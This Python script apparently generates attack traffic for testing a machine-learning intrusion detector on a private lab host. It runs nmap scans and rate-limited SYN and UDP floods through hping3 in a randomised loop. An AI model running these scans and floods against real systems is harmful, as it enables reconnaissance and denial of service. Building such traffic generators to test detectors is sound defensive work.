#!/usr/bin/env python3
import subprocess
import random
import time
import sys

TARGET = "10.0.1.2"
TCP_PORT = 80
UDP_PORT = 53


def run_nmap_scan():
    print("\n[ATTACK] Running SYN scan...")
    subprocess.run(["nmap", "-sS", TARGET])

    print("[ATTACK] Running aggressive scan...")
    subprocess.run(["nmap", "-A", TARGET])

def run_syn_flood(duration=10):
    print(f"\n[ATTACK] Starting SYN flood ({duration}s)...")
    process = subprocess.Popen([
        "sudo", "hping3",
        "-S",
        "-i", 
        "u1000",   # 1000 microseconds between packets
        # "--flood", -> remove for testing to avoid overwhelming the network
        "-p", str(TCP_PORT),
        "-s", "12345",  # fixed source port
        TARGET,
    ])
    time.sleep(duration)
    process.terminate()
    print("[ATTACK] SYN flood stopped.")

def run_udp_flood(duration=10):
    print(f"\n[ATTACK] Starting UDP flood ({duration}s)...")
    process = subprocess.Popen([
        "sudo", "hping3",
        "--udp",
        "-i", 
        "u1000",   # 1000 microseconds between packets
        # "--flood", -> remove for testing to avoid overwhelming the network
        "-p", str(UDP_PORT),
        "-s", "12345",  # fixed source port
        TARGET,
    ])
    time.sleep(duration)
    process.terminate()
    print("[ATTACK] UDP flood stopped.")

def main():
    print(f"[+] Starting mixed malicious traffic against {TARGET}")
    print("[+] Press Ctrl+C to stop\n")

    attacks = [run_syn_flood, run_udp_flood] # take out run_nmap_scan for testing - can't get flow of more than 1 -> need flow of > 20 for ml to run

    try:
        while True:
            attack = random.choice(attacks)
            attack()

            pause = random.randint(5, 15)
            print(f"\n[+] Cooling down for {pause} seconds...\n")
            time.sleep(pause)

    except KeyboardInterrupt:
        print("\n[-] Mixed malicious traffic stopped.")
        sys.exit(0)

if __name__ == "__main__":
    main()